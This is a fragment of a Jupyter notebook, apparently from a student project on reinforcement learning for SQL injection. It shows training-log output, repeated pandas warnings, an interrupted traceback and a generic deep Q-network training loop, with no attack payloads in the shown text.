      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -4031.14\t Episode 139\t Frame count: 428694\t Context: 2\n",
      "Running reward: -4031.14\t Episode 139\t Frame count: 430616\t Context: 2\n",
      "Running reward: -4081.70\t Episode 140\t Frame count: 430827\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -4081.70\t Episode 140\t Frame count: 437066\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -4137.06\t Episode 141\t Frame count: 440244\t Context: 2\n",
      "Running reward: -4137.06\t Episode 141\t Frame count: 440289\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -4163.42\t Episode 142\t Frame count: 442254\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -4163.42\t Episode 142\t Frame count: 444940\t Context: 2\n",
      "Running reward: -4205.68\t Episode 143\t Frame count: 446404\t Context: 2\n",
      "Running reward: -4205.68\t Episode 143\t Frame count: 446832\t Context: 2\n",
      "Running reward: -4218.48\t Episode 144\t Frame count: 447820\t Context: 2\n",
      "Running reward: -4218.48\t Episode 144\t Frame count: 448285\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -4223.58\t Episode 145\t Frame count: 452667\t Context: 2\n"
     ]
    },
    {
     "ename": "KeyboardInterrupt",
     "evalue": "",
     "output_type": "error",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mKeyboardInterrupt\u001b[0m                         Traceback (most recent call last)",
      "\u001b[1;32mc:\\Users\\ilija\\Dev\\ENGEN582\\sqli_rl.ipynb Cell 34\u001b[0m in \u001b[0;36m<cell line: 31>\u001b[1;34m()\u001b[0m\n\u001b[0;32m     <a href='vscode-notebook-cell:/c%3A/Users/ilija/Dev/ENGEN582/sqli_rl.ipynb#X44sZmlsZQ%3D%3D?line=82'>83</a>\u001b[0m \u001b[39m# Update every fourth frame and once batch size is over 32\u001b[39;00m\n\u001b[0;32m     <a href='vscode-notebook-cell:/c%3A/Users/ilija/Dev/ENGEN582/sqli_rl.ipynb#X44sZmlsZQ%3D%3D?line=83'>84</a>\u001b[0m \u001b[39mif\u001b[39;00m frame_count \u001b[39m%\u001b[39m update_after_actions \u001b[39m==\u001b[39m \u001b[39m0\u001b[39m \u001b[39mand\u001b[39;00m \u001b[39mlen\u001b[39m(done_history) \u001b[39m>\u001b[39m batch_size:\n\u001b[0;32m     <a href='vscode-notebook-cell:/c%3A/Users/ilija/Dev/ENGEN582/sqli_rl.ipynb#X44sZmlsZQ%3D%3D?line=84'>85</a>\u001b[0m \n\u001b[0;32m     <a href='vscode-notebook-cell:/c%3A/Users/ilija/Dev/ENGEN582/sqli_rl.ipynb#X44sZmlsZQ%3D%3D?line=85'>86</a>\u001b[0m     \u001b[39m# Get indices of samples for replay buffers\u001b[39;00m\n\u001b[1;32m---> <a href='vscode-notebook-cell:/c%3A/Users/ilija/Dev/ENGEN582/sqli_rl.ipynb#X44sZmlsZQ%3D%3D?line=86'>87</a>\u001b[0m     indices \u001b[39m=\u001b[39m np\u001b[39m.\u001b[39;49mrandom\u001b[39m.\u001b[39;49mchoice(\u001b[39mrange\u001b[39;49m(\u001b[39mlen\u001b[39;49m(done_history)), size\u001b[39m=\u001b[39;49mbatch_size)\n\u001b[0;32m     <a href='vscode-notebook-cell:/c%3A/Users/ilija/Dev/ENGEN582/sqli_rl.ipynb#X44sZmlsZQ%3D%3D?line=87'>88</a>\u001b[0m     \u001b[39m#print(state_history[-2:-1])\u001b[39;00m\n\u001b[0;32m     <a href='vscode-notebook-cell:/c%3A/Users/ilija/Dev/ENGEN582/sqli_rl.ipynb#X44sZmlsZQ%3D%3D?line=88'>89</a>\u001b[0m \n\u001b[0;32m     <a href='vscode-notebook-cell:/c%3A/Users/ilija/Dev/ENGEN582/sqli_rl.ipynb#X44sZmlsZQ%3D%3D?line=89'>90</a>\u001b[0m     \u001b[39m# Using list comprehension to sample from replay buffer\u001b[39;00m\n\u001b[0;32m     <a href='vscode-notebook-cell:/c%3A/Users/ilija/Dev/ENGEN582/sqli_rl.ipynb#X44sZmlsZQ%3D%3D?line=90'>91</a>\u001b[0m     state_sample \u001b[39m=\u001b[39m np\u001b[39m.\u001b[39marray([state_history[i] \u001b[39mfor\u001b[39;00m i \u001b[39min\u001b[39;00m indices])\u001b[39m.\u001b[39mreshape(batch_size, features, \u001b[39m1\u001b[39m)\n",
      "File \u001b[1;32mmtrand.pyx:962\u001b[0m, in \u001b[0;36mnumpy.random.mtrand.RandomState.choice\u001b[1;34m()\u001b[0m\n",
      "File \u001b[1;32mmtrand.pyx:746\u001b[0m, in \u001b[0;36mnumpy.random.mtrand.RandomState.randint\u001b[1;34m()\u001b[0m\n",
      "File \u001b[1;32m_bounded_integers.pyx:1319\u001b[0m, in \u001b[0;36mnumpy.random._bounded_integers._rand_int32\u001b[1;34m()\u001b[0m\n",
      "File \u001b[1;32m<__array_function__ internals>:180\u001b[0m, in \u001b[0;36mprod\u001b[1;34m(*args, **kwargs)\u001b[0m\n",
      "File \u001b[1;32mc:\\Users\\ilija\\AppData\\Local\\Programs\\Python\\Python310\\lib\\site-packages\\numpy\\core\\fromnumeric.py:3088\u001b[0m, in \u001b[0;36mprod\u001b[1;34m(a, axis, dtype, out, keepdims, initial, where)\u001b[0m\n\u001b[0;32m   2970\u001b[0m \u001b[39m@array_function_dispatch\u001b[39m(_prod_dispatcher)\n\u001b[0;32m   2971\u001b[0m \u001b[39mdef\u001b[39;00m \u001b[39mprod\u001b[39m(a, axis\u001b[39m=\u001b[39m\u001b[39mNone\u001b[39;00m, dtype\u001b[39m=\u001b[39m\u001b[39mNone\u001b[39;00m, out\u001b[39m=\u001b[39m\u001b[39mNone\u001b[39;00m, keepdims\u001b[39m=\u001b[39mnp\u001b[39m.\u001b[39m_NoValue,\n\u001b[0;32m   2972\u001b[0m          initial\u001b[39m=\u001b[39mnp\u001b[39m.\u001b[39m_NoValue, where\u001b[39m=\u001b[39mnp\u001b[39m.\u001b[39m_NoValue):\n\u001b[0;32m   2973\u001b[0m     \u001b[39m\"\"\"\u001b[39;00m\n\u001b[0;32m   2974\u001b[0m \u001b[39m    Return the product of array elements over a given axis.\u001b[39;00m\n\u001b[0;32m   2975\u001b[0m \n\u001b[1;32m   (...)\u001b[0m\n\u001b[0;32m   3086\u001b[0m \u001b[39m    10\u001b[39;00m\n\u001b[0;32m   3087\u001b[0m \u001b[39m    \"\"\"\u001b[39;00m\n\u001b[1;32m-> 3088\u001b[0m     \u001b[39mreturn\u001b[39;00m _wrapreduction(a, np\u001b[39m.\u001b[39;49mmultiply, \u001b[39m'\u001b[39;49m\u001b[39mprod\u001b[39;49m\u001b[39m'\u001b[39;49m, axis, dtype, out,\n\u001b[0;32m   3089\u001b[0m                           keepdims\u001b[39m=\u001b[39;49mkeepdims, initial\u001b[39m=\u001b[39;49minitial, where\u001b[39m=\u001b[39;49mwhere)\n",
      "\u001b[1;31mKeyboardInterrupt\u001b[0m: "
     ]
    }
   ],
   "source": [
    "# In the Deepmind paper they use RMSProp however then Adam optimizer\n",
    "# improves training time\n",
    "optimizer = keras.optimizers.Adam(learning_rate=learning_rate, clipnorm=1.0)\n",
    "\n",
    "# Experience replay buffers\n",
    "action_history = []\n",
    "state_history = []\n",
    "state_next_history = []\n",
    "rewards_history = []\n",
    "done_history = []\n",
    "episode_reward_history = []\n",
    "running_reward = 0\n",
    "episode_count = 0\n",
    "frame_count = 0\n",
    "# Number of frames to take random action and observe output\n",
    "epsilon_random_frames = 500\n",
    "# Number of frames for exploration\n",
    "epsilon_greedy_frames = 1000000.0\n",
    "# Maximum replay length\n",
    "# Note: The Deepmind paper suggests 1000000 however this causes memory issues\n",
    "max_memory_length = 1000000\n",
    "# Train the model after 4 actions\n",
    "update_after_actions = 4\n",
    "# How often to update the target network\n",
    "update_target_network = 100\n",
    "# Using huber loss for stability\n",
    "loss_function = keras.losses.Huber()\n",
    "\n",
    "analytics = DQNAnalytics()\n",
    "\n",
    "while True:  # Run until solved\n",
    "    state = create_empty_state()\n",
    "    episode_reward = 0\n",
    "    reset_context()\n",
    "    context_actions = 0\n",
    "\n",
    "    analytics.begin_episode()\n",
    "    for timestep in range(1, max_steps_per_episode):\n",
    "        # env.render(); Adding this line would show the attempts\n",
    "        # of the agent in a pop up window.\n",
    "        frame_count += 1\n",
    "\n",
    "        # Use epsilon-greedy for exploration\n",
    "        if frame_count < epsilon_random_frames or epsilon > np.random.rand(1)[0]:\n",
    "            # random action\n",
    "            action = np.random.choice(num_actions)\n",
    "        else:\n",
    "            # Predict action Q-values\n",
    "            # From environment state\n",
    "            action_probs = model(state.reshape(1, features, 1), training=False)\n",
    "            # Take best action\n",
    "            action = tf.argmax(action_probs[0]).numpy()\n",
    "\n",
    "        # Decay probability of taking random action\n",
    "        epsilon -= epsilon_interval / epsilon_greedy_frames\n",
    "        epsilon = max(epsilon, epsilon_min)\n",
    "\n",
    "        # Apply the sampled action in our environment\n",
    "        res, reward, done = perform_action(action)\n",
    "        state_next = update_state(state, res)\n",
    "        \n",
    "        analytics.add_attempt()\n",
    "        state_next = state_next\n",
    "\n",
    "        episode_reward += reward\n",
    "\n",
    "        # If the reward is positive, a context has been solved.\n",
    "        # Keep track of this.\n",
    "        if reward > 0:\n",
    "            analytics.record_success(action)\n",
    "            # Log details\n",
    "            template = 'Running reward: {:.2f}\\t Episode {}\\t Frame count: {}\\t Context: {}'\n",
    "            print(template.format(running_reward, episode_count + 1, frame_count, context_index + 1))\n",
    "\n",
    "        # Save actions and states in replay buffer\n",
    "        action_history.append(action)\n",
    "        state_history.append(state)\n",
    "        state_next_history.append(state_next)\n",
    "        done_history.append(done)\n",
    "        rewards_history.append(reward)\n",
    "        state = state_next\n",
    "\n",
    "        # Update every fourth frame and once batch size is over 32\n",
    "        if frame_count % update_after_actions == 0 and len(done_history) > batch_size:\n",
    "\n",
    "            # Get indices of samples for replay buffers\n",
    "            indices = np.random.choice(range(len(done_history)), size=batch_size)\n",
    "            #print(state_history[-2:-1])\n",
    "\n",
    "            # Using list comprehension to sample from replay buffer\n",
    "            state_sample = np.array([state_history[i] for i in indices]).reshape(batch_size, features, 1)\n",
    "            state_next_sample = np.array([state_next_history[i] for i in indices]).reshape(batch_size, features, 1)\n",
    "            rewards_sample = [rewards_history[i] for i in indices]\n",
    "            action_sample = [action_history[i] for i in indices]\n",
    "            done_sample = tf.convert_to_tensor(\n",
    "                [float(done_history[i]) for i in indices]\n",
    "            )\n",
    "\n",
    "            # Build the updated Q-values for the sampled future states\n",
